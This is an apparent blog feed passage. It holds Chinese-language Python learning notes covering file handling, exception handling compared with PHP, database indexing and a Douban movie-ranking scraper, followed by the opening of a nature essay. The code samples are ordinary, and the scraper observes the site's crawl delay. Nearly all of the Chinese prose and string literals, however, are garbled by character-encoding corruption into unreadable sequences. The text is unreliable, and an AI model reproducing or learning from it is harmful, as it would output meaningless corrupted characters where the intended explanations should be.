·åœ¨å¹•åä¿®æ”¹æ–‡ä»¶æ•°æ®å¯¹æ–‡æœ¬æ–‡ä»¶æ¥è¯´æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯ä¼šç ´åäºŒè¿›åˆ¶æ•°æ®ä¾‹å¦‚ JPEG æˆ– EXE æ–‡ä»¶ä¸­çš„æ•°æ®ã€‚è¯·ä¸€å®šè¦æ³¨æ„åœ¨è¯»å†™æ­¤ç±»æ–‡ä»¶æ—¶åº”ä½¿ç”¨äºŒè¿›åˆ¶æ¨¡å¼ã€‚</p><p>åœ¨å¤„ç†æ–‡ä»¶å¯¹è±¡æ—¶ï¼Œæœ€å¥½ä½¿ç”¨ with å…³é”®å­—ã€‚ä¼˜ç‚¹æ˜¯å½“å­å¥ä½“ç»“æŸåæ–‡ä»¶ä¼šæ­£ç¡®å…³é—­ï¼Œå³ä½¿åœ¨æŸä¸ªæ—¶åˆ»å¼•å‘äº†å¼‚å¸¸ã€‚ è€Œä¸”ä½¿ç”¨ with ç›¸æ¯”ç­‰æ•ˆçš„ <code>try-finally</code> ä»£ç å—è¦ç®€çŸ­å¾—å¤š:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'workfile'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    read_data = f.read()</span><br></pre></td></tr></table></figure><p>è¦è¯»å–æ–‡ä»¶å†…å®¹ï¼Œè¯·è°ƒç”¨ f.read(size)ï¼Œå®ƒä¼šè¯»å–ä¸€äº›æ•°æ®å¹¶å°†å…¶ä½œä¸ºå­—ç¬¦ä¸²ï¼ˆåœ¨æ–‡æœ¬æ¨¡å¼ä¸‹ï¼‰æˆ–å­—èŠ‚ä¸²å¯¹è±¡ï¼ˆåœ¨äºŒè¿›åˆ¶æ¨¡å¼ä¸‹ï¼‰è¿”å›ã€‚ size æ˜¯ä¸€ä¸ªå¯é€‰çš„æ•°å€¼å‚æ•°ã€‚ å½“ size è¢«çœç•¥æˆ–è€…ä¸ºè´Ÿæ•°æ—¶ï¼Œå°†è¯»å–å¹¶è¿”å›æ•´ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼›å¦‚æœæ–‡ä»¶çš„å¤§å°æ˜¯ä½ çš„æœºå™¨å†…å­˜çš„ä¸¤å€å°±ä¼šå‡ºç°é—®é¢˜ã€‚ å½“å–å…¶ä»–å€¼æ—¶ï¼Œå°†è¯»å–å¹¶è¿”å›è‡³å¤š size ä¸ªå­—ç¬¦ï¼ˆåœ¨æ–‡æœ¬æ¨¡å¼ä¸‹ï¼‰æˆ– size ä¸ªå­—èŠ‚ï¼ˆåœ¨äºŒè¿›åˆ¶æ¨¡å¼ä¸‹ï¼‰ã€‚ å¦‚æœå·²åˆ°è¾¾æ–‡ä»¶æœ«å°¾ï¼Œf.read() å°†è¿”å›ä¸€ä¸ªç©ºå­—ç¬¦ä¸² (â€˜â€™)ã€‚</p><p>f.readline() ä»æ–‡ä»¶ä¸­è¯»å–ä¸€è¡Œï¼›æ¢è¡Œç¬¦ï¼ˆ\nï¼‰ç•™åœ¨å­—ç¬¦ä¸²çš„æœ«å°¾ï¼Œå¦‚æœæ–‡ä»¶ä¸ä»¥æ¢è¡Œç¬¦ç»“å°¾ï¼Œåˆ™åœ¨æ–‡ä»¶çš„æœ€åä¸€è¡Œçœç•¥ã€‚è¿™ä½¿å¾—è¿”å›å€¼æ˜ç¡®æ— è¯¯ï¼›å¦‚æœ f.readline() è¿”å›ä¸€ä¸ªç©ºçš„å­—ç¬¦ä¸²ï¼Œåˆ™è¡¨ç¤ºå·²ç»åˆ°è¾¾äº†æ–‡ä»¶æœ«å°¾ï¼Œè€Œç©ºè¡Œä½¿ç”¨ â€˜\nâ€™ è¡¨ç¤ºï¼Œè¯¥å­—ç¬¦ä¸²åªåŒ…å«ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚</p><h1 id="å¼‚å¸¸å¤„ç†"><a href="#å¼‚å¸¸å¤„ç†" class="headerlink" title="å¼‚å¸¸å¤„ç†"></a>å¼‚å¸¸å¤„ç†</h1><p>Python ä¸­ä½¿ç”¨<code>try - raise - except - (else -) finally</code>ï¼ŒPHP ä¸­ä½¿ç”¨<code>try - throw - catch - finally</code>ç»“æ„å¤„ç†å¼‚å¸¸ã€‚</p><p>Python ä¸­çš„<code>except</code>è¯­å¥å¯ä»¥ä»¥å…ƒç»„å½¢å¼åŒæ—¶æŒ‡å®šå¤šä¸ªå¼‚å¸¸ï¼Œè‹¥ä¸æŒ‡å®šå¼‚å¸¸ç±»å‹ï¼Œåˆ™é»˜è®¤æ•è·æ‰€æœ‰å¼‚å¸¸(ä¸å»ºè®®åœ¨ä¸æ¸…æ¥šé€»è¾‘çš„æƒ…å†µä¸‹æ•è·æ‰€æœ‰å¼‚å¸¸ï¼Œæœ‰å¯èƒ½ä½ éšè—äº†å¾ˆä¸¥é‡çš„é—®é¢˜)ã€‚PHP ä¸­åˆ™ä½¿ç”¨<code>|</code>åŒæ—¶æŒ‡å®šå¤šä¸ªå¼‚å¸¸ã€‚<br><a href="https://www.zhihu.com/question/266526582/answer/310526097" target="_blank" rel="noopener">Pythonä¸­tryâ€¦exceptâ€¦elseâ€¦ç»“æ„ä¸­elseçš„ä½œç”¨ï¼Ÿ - å¼ é›¨èŒçš„å›ç­”</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (range(<span class="number">1</span>,<span class="number">10</span>) <span class="keyword">as</span> $num) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">5</span> == $num) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'It\'s five!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> $num, PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $e-&gt;getMessage(), PHP_EOL;</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Done'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="number">5</span> == num :</span><br><span class="line">            <span class="comment"># raise Exception("It's five!")</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        print(num)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'Everything is all right'</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    print(<span class="string">'Done'</span>)</span><br></pre></td></tr></table></figure><p>åœ¨å®é™…åº”ç”¨ç¨‹åºä¸­ï¼Œ<code>finally</code> å­å¥å¯¹äºé‡Šæ”¾å¤–éƒ¨èµ„æºï¼ˆä¾‹å¦‚æ–‡ä»¶æˆ–è€…ç½‘ç»œè¿æ¥ï¼‰éå¸¸æœ‰ç”¨ï¼Œæ— è®ºæ˜¯å¦æˆåŠŸä½¿ç”¨èµ„æºã€‚</p><h1 id="ç±»"><a href="#ç±»" class="headerlink" title="ç±»"></a>ç±»</h1><p>python ä¸­ä½¿ç”¨<code>.</code>è°ƒç”¨å±æ€§ï¼Œè€Œ PHP ä¸­ä½¿ç”¨<code>-&gt;</code>è°ƒç”¨å±æ€§</p><h1 id="åŒ-PHP-çš„å¯¹æ¯”"><a href="#åŒ-PHP-çš„å¯¹æ¯”" class="headerlink" title="åŒ PHP çš„å¯¹æ¯”"></a>åŒ PHP çš„å¯¹æ¯”</h1><p>Python ä¸­çš„<code>True``False``None</code>éƒ½æ˜¯é¦–å­—æ¯å¤§å†™ï¼Œè€Œ Python ä¸­çš„<code>None</code>ç­‰åŒäº PHP ä¸­çš„<code>null</code></p><h2 id="Python-æ¯”-PHP-é«˜æ•ˆçš„åœ°æ–¹"><a href="#Python-æ¯”-PHP-é«˜æ•ˆçš„åœ°æ–¹" class="headerlink" title="Python æ¯” PHP é«˜æ•ˆçš„åœ°æ–¹"></a>Python æ¯” PHP é«˜æ•ˆçš„åœ°æ–¹</h2><p>ç§»é™¤æŒ‡å®šåŒºé—´æ•°ç»„/åˆ—è¡¨å…ƒç´ <br>python <code>letters[2:5] = []</code><br>php å¾ªç¯å– key å unset()</p><p>python æ”¯æŒ for éå†å­—ç¬¦ä¸²ã€æ”¯æŒå¤šå€¼åŒæ—¶éå†<br>pythonåœ¨è¡¨è¾¾å¼å†…éƒ¨èµ‹å€¼å¿…é¡»æ˜¾å¼åœ°ä½¿ç”¨æµ·è±¡è¿ç®—ç¬¦ <code>:=</code> æ¥å®Œæˆï¼Œè¿™é¿å…äº†æƒ³è¦åœ¨è¡¨è¾¾å¼ä¸­å†™ == æ—¶å´å†™æˆäº† =ã€‚(66666)</p><h2 id="Python-æ¯”-PHP-ä½æ•ˆçš„åœ°æ–¹"><a href="#Python-æ¯”-PHP-ä½æ•ˆçš„åœ°æ–¹" class="headerlink" title="Python æ¯” PHP ä½æ•ˆçš„åœ°æ–¹"></a>Python æ¯” PHP ä½æ•ˆçš„åœ°æ–¹</h2><p>PythonæŸ¥æ‰¾ä¸€ä¸ªå˜é‡æ—¶ä¼šæŒ‰ç…§â€œå±€éƒ¨ä½œç”¨åŸŸâ€ã€â€œåµŒå¥—ä½œç”¨åŸŸâ€ã€â€œå…¨å±€ä½œç”¨åŸŸâ€å’Œâ€œå†…ç½®ä½œç”¨åŸŸâ€çš„é¡ºåºè¿›è¡Œæœç´¢<br>Pythonä¸ºå­—ç¬¦ä¸²ç±»å‹æä¾›äº†éå¸¸ä¸°å¯Œçš„è¿ç®—ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨+è¿ç®—ç¬¦æ¥å®ç°å­—ç¬¦ä¸²çš„æ‹¼æ¥ï¼Œå¯ä»¥ä½¿ç”¨*è¿ç®—ç¬¦æ¥é‡å¤ä¸€ä¸ªå­—ç¬¦ä¸²çš„å†…å®¹ï¼Œå¯ä»¥ä½¿ç”¨inå’Œnot inæ¥åˆ¤æ–­ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åŒ…å«å¦å¤–ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆæˆå‘˜è¿ç®—ï¼‰ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨[]å’Œ[:]è¿ç®—ç¬¦ä»å­—ç¬¦ä¸²å–å‡ºæŸä¸ªå­—ç¬¦æˆ–æŸäº›å­—ç¬¦ï¼ˆåˆ‡ç‰‡è¿ç®—</p><p>#ç–‘æƒ‘<br>ä¸ºä»€ä¹ˆæµ®ç‚¹æ•°åœ¨è®¡ç®—æœºä¸­æ— æ³•ç²¾ç¡®å­˜å‚¨ï¼Ÿè´¢åŠ¡é‡‘é¢è®¡ç®—å¦‚ä½•è§£å†³æµ®ç‚¹æ•°çš„ç²¾åº¦é—®é¢˜</p><p>InnoDBä½¿ç”¨çš„B-treeç´¢å¼•ï¼Œæ•°å€¼ç±»å‹çš„åˆ—é™¤äº†ç­‰å€¼åˆ¤æ–­æ—¶ç´¢å¼•ä¼šç”Ÿæ•ˆä¹‹å¤–ï¼Œä½¿ç”¨&gt;ã€&lt;ã€&gt;=ã€&lt;=ã€BETWEENâ€¦ANDâ€¦ ã€&lt;&gt;æ—¶ï¼Œç´¢å¼•ä»ç„¶ç”Ÿæ•ˆï¼›å¯¹äºå­—ç¬¦ä¸²ç±»å‹çš„åˆ—ï¼Œå¦‚æœä½¿ç”¨ä¸ä»¥é€šé…ç¬¦å¼€å¤´çš„æ¨¡ç³ŠæŸ¥è¯¢ï¼Œç´¢å¼•ä¹Ÿæ˜¯èµ·ä½œç”¨çš„ï¼Œä½†æ˜¯å…¶ä»–çš„æƒ…å†µä¼šå¯¼è‡´ç´¢å¼•å¤±æ•ˆï¼Œè¿™å°±æ„å‘³ç€å¾ˆæœ‰å¯èƒ½ä¼šåšå…¨è¡¨æŸ¥è¯¢ã€‚</p><p>SQL|MongoDB|è§£é‡Šï¼ˆSQL/MongoDBï¼‰<br>|-|-|-|<br>database|database|æ•°æ®åº“/æ•°æ®åº“<br>table|collection|äºŒç»´è¡¨/é›†åˆ<br>row|document|è®°å½•ï¼ˆè¡Œï¼‰/æ–‡æ¡£<br>column|field|å­—æ®µï¼ˆåˆ—ï¼‰/åŸŸ<br>index|index|ç´¢å¼•/ç´¢å¼•<br>table joins|â€”|è¡¨è¿æ¥/åµŒå¥—æ–‡æ¡£<br>primary key|primary key|ä¸»é”®/ä¸»é”®ï¼ˆ_idå­—æ®µï¼‰</p><h1 id="è®­ç»ƒåœº"><a href="#è®­ç»ƒåœº" class="headerlink" title="è®­ç»ƒåœº"></a>è®­ç»ƒåœº</h1><p>ä¿—è¯è¯´ï¼Œå…‰è¯´ä¸ç»ƒå‡æŠŠå¼ï¼Œæˆ‘ä»¬å°±ç”¨ä»…æœ‰çš„åªæ˜¯æ¥æŠ“å–è±†ç“£ç”µå½± top250 çš„ä¿¡æ¯å¯¼å‡ºä¸º Excel</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">""""</span></span><br><span class="line"><span class="string">å­¦çˆ¬è™«åˆ©å™¨ XPath, çœ‹è¿™ä¸€ç¯‡å°±å¤Ÿäº† https://zhuanlan.zhihu.com/p/29436838</span></span><br><span class="line"><span class="string"> https://www.jianshu.com/p/cd3b80849613</span></span><br><span class="line"><span class="string"> https://zhuanlan.zhihu.com/p/99810013</span></span><br><span class="line"><span class="string">python lxml æ•™ç¨‹ https://www.cnblogs.com/dahu-daqing/p/6749666.html</span></span><br><span class="line"><span class="string">Python æœ€ä½³å®è·µæŒ‡å— https://pythonguidecn.readthedocs.io/zh/latest/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xlwt é’ˆå¯¹ Ecxec2007 ä¹‹å‰çš„ç‰ˆæœ¬ï¼Œå³.xls æ–‡ä»¶ï¼Œå…¶è¦æ±‚å•ä¸ª sheet ä¸è¶…è¿‡ 65535 è¡Œï¼Œè€Œ openpyxl åˆ™ä¸»è¦é’ˆå¯¹ Excel2007 ä¹‹åçš„ç‰ˆæœ¬ï¼ˆ.xlsxï¼‰ï¼Œå®ƒå¯¹æ–‡ä»¶å¤§å°æ²¡æœ‰é™åˆ¶ã€‚xlrd/xlwtçš„è¯»å†™é€Ÿåº¦ä¹Ÿä¼˜äºopenpyxl</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> xlwt</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> lxml.etree</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">'user-agent'</span>: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wb = xlwt.Workbook()</span><br><span class="line">sheet = wb.add_sheet(<span class="string">'Movie'</span>)</span><br><span class="line">title = (<span class="string">'æ’å'</span>, <span class="string">'é“¾æ¥'</span>, <span class="string">'ç‰‡å'</span>, <span class="string">'æµ·æŠ¥'</span>, <span class="string">'è¯­å½•'</span>, <span class="string">'å¯¼æ¼”'</span>, <span class="string">'ç±»å‹'</span>, <span class="string">'ä¸Šæ˜ æ—¥æœŸ'</span>, <span class="string">'å›½å®¶'</span>, <span class="string">'è¯„åˆ†'</span>, <span class="string">'è¯„ä»·äººæ•°'</span>, <span class="string">'IMDB é“¾æ¥'</span>)</span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(len(title)):</span><br><span class="line">    sheet.write(<span class="number">0</span>, index, title[index])</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">æ¯é¡µ 25 æ¡æ•°æ®ï¼Œå…± 10 é¡µ</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">for</span> start <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">    url = <span class="string">'https://movie.douban.com/top250?start='</span> + str(start * <span class="number">25</span>) + <span class="string">'&amp;filter='</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># è·å–æ’è¡Œé¡µå†…å®¹å¹¶ XML åŒ–å¤„ç†</span></span><br><span class="line">    list_page_selector = lxml.etree.HTML(requests.get(url, headers=header).text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">26</span>):</span><br><span class="line">        base_xpath = <span class="string">'//*[@id="content"]/div/div[1]/ol/li['</span> + str(item)</span><br><span class="line"></span><br><span class="line">        ranking = int(list_page_selector.xpath(base_xpath + <span class="string">']/div/div[1]/em/text()'</span>)[<span class="number">0</span>])</span><br><span class="line">        link = list_page_selector.xpath(base_xpath + <span class="string">']/div/div[2]/div[1]/a/@href'</span>)[<span class="number">0</span>]</span><br><span class="line">        movie_info = list_page_selector.xpath(base_xpath + <span class="string">']/div/div[2]/div[2]/p[1]/text()[2]'</span>)[<span class="number">0</span>].strip().split(<span class="string">' / '</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># è·å–å½±ç‰‡è¯¦æƒ…é¡µå†…å®¹</span></span><br><span class="line">        detail_page_selector = lxml.etree.HTML(requests.get(link, headers=header).text)</span><br><span class="line"></span><br><span class="line">        movie = [</span><br><span class="line">            ranking,  <span class="comment"># Ranking</span></span><br><span class="line">            link,  <span class="comment"># Link</span></span><br><span class="line">            detail_page_selector.xpath(<span class="string">'//*[@id="content"]/h1/span[1]/text()'</span>)[<span class="number">0</span>],  <span class="comment"># Name</span></span><br><span class="line">            list_page_selector.xpath(base_xpath + <span class="string">']/div/div[1]/a/img/@src'</span>)[<span class="number">0</span>].replace(<span class="string">'s_ratio_poster'</span>, <span class="string">'raw'</span>),  <span class="comment"># Poster</span></span><br><span class="line">            list_page_selector.xpath(base_xpath + <span class="string">']/div/div[2]/div[2]/p[2]/span/text()'</span>)[<span class="number">0</span>],  <span class="comment"># Quote</span></span><br><span class="line">            detail_page_selector.xpath(<span class="string">'//*[@id="info"]/span[1]/span[2]/a/text()'</span>)[<span class="number">0</span>],  <span class="comment"># Director</span></span><br><span class="line">            movie_info[<span class="number">2</span>],  <span class="comment"># Type</span></span><br><span class="line">            <span class="comment"># detail_page_selector.xpath('//*[@id="info"]/span[13]/text()'),  # Runtime  ç‰‡é•¿æ— æ³•æ­£å¸¸è·å–</span></span><br><span class="line">            movie_info[<span class="number">0</span>],  <span class="comment"># Release Date</span></span><br><span class="line">            movie_info[<span class="number">1</span>],  <span class="comment"># Country</span></span><br><span class="line">            list_page_selector.xpath(base_xpath + <span class="string">']/div/div[2]/div[2]/div/span[2]/text()'</span>)[<span class="number">0</span>],  <span class="comment"># Rating</span></span><br><span class="line">            <span class="string">"&#123;:,&#125;"</span>.format(int(list_page_selector.xpath(base_xpath + <span class="string">']/div/div[2]/div[2]/div/span[4]/text()'</span>)[<span class="number">0</span>].replace(<span class="string">'äººè¯„ä»·'</span>, <span class="string">''</span>))),  <span class="comment"># Ratings</span></span><br><span class="line">            detail_page_selector.xpath(<span class="string">'//*[@id="info"]/a/@href'</span>)[<span class="number">0</span>]  <span class="comment"># IMDB</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å°†æ•°æ®å¡«å……å…¥è¡¨æ ¼</span></span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> range(len(movie)):</span><br><span class="line">            sheet.write(ranking, index, movie[index])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ ¹æ® https://movie.douban.com/robots.txt å¾— Crawl-delay: 5</span></span><br><span class="line">    sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">wb.save(<span class="string">'./Douban_movie_top_250.xls'</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'DONE'</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è‡ªç„¶ä¼ å¥‡</title>
      <link href="/post/nature-legend/"/>
      <url>/post/nature-legend/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006tNbRwly1g9o8l03ynoj30u00gvq9c.jpg" alt=""></p><a id="more"></a><p>åœ¨ä¼˜èƒœåŠ£æ±°çš„è‡ªç„¶æ³•åˆ™é¢å‰ï¼Œä¸€åˆ‡åŠ›é‡éƒ½æ˜¾å¾—å¤ªè¿‡æ¸ºå°ç¾¸å¼±â€”â€”åˆšå‡ºç”Ÿçš„è§’é©¬å°±è¦èº²é¿ç‹®å­çš„è¿½æ•ï¼Œæ´„æ¸¸äº§åµçš„é±¼ç¾¤è¦ç»è¿‡ä¹æ­»ä¸€ç”Ÿï¼Œæ— æ³•äº‰å¾—é¢†åœ°çš„é›„æ€§åªèƒ½å­¤ç‹¬ç»ˆè€ï¼Œå› ç”Ÿç—…æˆ–å—ä¼¤è€Œä¸§å¤±æ•é£Ÿèƒ½åŠ›çš„åŠ¨ç‰©åªèƒ½é¢ä¸´è¢«æ•é£Ÿæˆ–è€…é¥¿æ­»çš„å‘½è¿ã€‚</p><p>ä½†å„ç§ç‰©ç§çš„ç”Ÿå­˜æŠ€èƒ½åˆä»¤äººæƒŠå¹ä¸å·²â€”â€”é£é±¼ä¸ºèº²é¿è¿½å‡»ï¼Œè·ƒå‡ºæ°´é¢æ»‘ç¿”æ•°ç™¾ç±³ï¼›æµ·è±šä¸ºäº†æ•é£Ÿï¼Œå›¢é˜Ÿåˆä½œæ…æ‹Œæ·¤æ³¥é©±èµ¶é±¼ç¾¤ï¼›å˜è‰²é¾™ä½œä¸ºä¼ªè£…å¤§å¸ˆè®©è‡ªå·±â€œéšèº«â€ï¼Œéæ´²é‡çŠ¬é€šè¿‡åä½œæ•æ€æ•°å€äºè‡ªå·±çš„çŒç‰©ã€‚</p><p>åœ¨è‡ªç„¶ä¸–ç•Œé‡Œï¼Œå……æ»¡äº†ä¼ªè£…ã€ç‹¡è¯ˆã€æ®‹é…·ã€åˆä½œã€æ¸©æƒ…ï¼Œä»¤äººæƒŠå¿ƒåŠ¨é­„çš„ç”Ÿæ­»é€ƒäº¡åœ¨æ—¶åˆ»ä¸Šæ¼”ï¼Œä»¤äººåŠ¨å®¹çš„æ•…äº‹ä¹Ÿä¸ä¼šè¢«æˆ‘ä»¬æ‰€é—å¿˜ï¼Œå®ƒä»¬æ‰€æœ‰çš„åŠªåŠ›éƒ½åªæ˜¯ä¸ºäº†ç”Ÿå‘½çš„å»¶ç»­ã€‚</p><p>å°æ—¶å€™æˆ‘åœ¨æƒ³ï¼Œä¸ºä»€ä¹ˆæˆ‘æ˜¯ä¸€ä¸ªäººï¼Œè€Œä¸æ˜¯ä¸€ç›´èš‚èšï¼Œä¸€æ¡èš¯èš“ï¼Ÿæˆ‘ä¸ºä»€ä¹ˆæ˜¯æˆ‘ï¼Œè€Œä¸æ˜¯ä½ ï¼Œæˆ–è€…ä»–ï¼Ÿæˆ‘ç»ˆç©¶è¿˜æ˜¯æ²¡èƒ½æ‰¾åˆ°ç­”æ¡ˆï¼Œåœ¨æ€ç´¢ä¸­æ²‰æ²‰ç¡å»ã€‚ç°åœ¨ï¼Œæˆ‘åº†å¹¸è‡ªå·±æ˜¯äººç±»ï¼Œè€Œä¸”æ˜¯åœ¨ä¸€ä¸ªå®‰å®šçš„å¼ºå›½ä¸­ï¼Œè‡³å°‘åœ¨æ–‡æ˜çš„ç¤¾ä¼šé‡Œï¼Œç”Ÿå­˜ä¸ç”¨é‚£ä¹ˆè¡€è…¥æ®‹æš´ï¼Œæˆ‘ä¸ä¼šå› ä¸ºéª¨æŠ˜è€Œè¢«æ·˜æ±°ï¼Œä¸ç”¨æ—¶åˆ»æ‹…å¿ƒæ é£Ÿè€…çš„çªç„¶å‡ºç°ã€‚</p><p>åœ¨æµ©ç€šçš„å®‡å®™ä¸­ï¼Œé€‚å®œç”Ÿå‘½çš„æ˜Ÿçƒæ˜¯å°‘ä¹‹åˆå°‘ï¼Œè€Œåœ¨<a href="http://timelineofearth.com/" target="_blank" rel="noopener">åœ°çƒäº¿ä¸‡å¹´</a>é—´ï¼Œç”Ÿç‰©ç¾¤å‘ç”Ÿå¤šæ¬¡çš„ç­ç»ä¸å¤è‹ï¼Œæ°”å€™ç¯å¢ƒå‰§çƒˆå˜åŒ–ï¼Œè¯´ä¸å®šå“ªæ¬¡çš„ç‰©ç§ç­ç»å°±ä¼šå¯¼è‡´åœ°çƒä¸å†é€‚å®œç”Ÿå‘½ï¼Œèƒ½äº§ç”Ÿé€‚å®œäººç±»ç”Ÿå­˜çš„ç¯å¢ƒæ¦‚ç‡çœŸçš„æ¯”ä¸­å½©ç¥¨çš„æ¦‚ç‡è¿˜è¦ä½çš„å¤šã€‚è¿„ä»Šä¸ºæ­¢ï¼Œåœ°çƒå·²ç»å‘ç”Ÿäº†äº”æ¬¡å¤§è§„æ¨¡ç‰©ç§<a href="https://zh.wikipedia.org/wiki/%E7%94%9F%E7%89%A9%E9%9B%86%E7%BE%A4%E7%81%AD%E7%BB%9D" target="_blank" rel="noopener">ç­ç»äº‹ä»¶</a>ï¼Œåœ¨<a href="https://zh.wikipedia.org/wiki/%E4%BA%8C%E5%8F%A0%E7%BA%AA%EF%BC%8D%E4%B8%89%E5%8F%A0%E7%BA%AA%E7%81%AD%E7%BB%9D%E4%BA%8B%E4%BB%B6" target="_blank" rel="noopener">äºŒå çºª - ä¸‰å çºªç­ç»äº‹ä»¶</a>ä¸­æ›´æ˜¯ç­ç»äº†å½“æ—¶åœ°çƒçº¦ 90%çš„ç‰©ç§ã€‚æé¾™æ›¾ç»ä½œä¸ºåœ°çƒéœ¸ä¸»ï¼Œæ¨ªæ‰«å¤§é™†ï¼Œæ”¯é…é™†åœ°ç”Ÿæ€ç³»ç»Ÿè¶…è¿‡ä¸€äº¿å››åƒä¸‡å¹´ä¹‹ä¹…ï¼Œéé¸Ÿå½¢æé¾™æœ€ç»ˆåœ¨<a href="https://zh.wikipedia.org/wiki/%E7%99%BD%E5%9E%A9%E7%BA%AA%EF%B9%A3%E5%8F%A4%E8%BF%91%E7%BA%AA%E7%81%AD%E7%BB%9D%E4%BA%8B%E4%BB%B6" target="_blank" 